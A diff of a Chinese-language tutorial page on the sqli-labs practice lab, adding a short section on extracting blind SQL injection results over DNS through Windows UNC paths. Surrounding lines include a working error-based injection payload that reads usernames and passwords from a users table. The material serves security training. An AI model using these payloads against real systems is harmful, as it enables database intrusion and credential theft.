@@ -83,6 +83,8 @@
 <p><code>-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(username,&#39;|&#39;,password) from users limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</code></p>
 <p>修改limit，读取剩下的数据：</p>
 <p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-7.jpg" alt="2-7.jpg"></p>
+<h2 id="用DNS带出无回显的注入结果"><a href="#用DNS带出无回显的注入结果" class="headerlink" title="用DNS带出无回显的注入结果"></a>用DNS带出无回显的注入结果</h2><p><a href="www.0xby.com/916.html">详情点击此处</a></p>
+<p>这种方法只能在<strong>windows</strong>的服务器下使用，由于UNC路径为<code>\\servername\filename</code><br>所以当我们访问<code>\\xxxxx.com\1.txt</code> 需要构造<code>\\\\xxxx.com\\1.txt</code> 四个反斜杠的原因是因为将反斜杠做转义，不然两个\会被转义为一个，导致语句报错。</p>
 <h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>单引号不报错，双引号报错：</p>
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p>
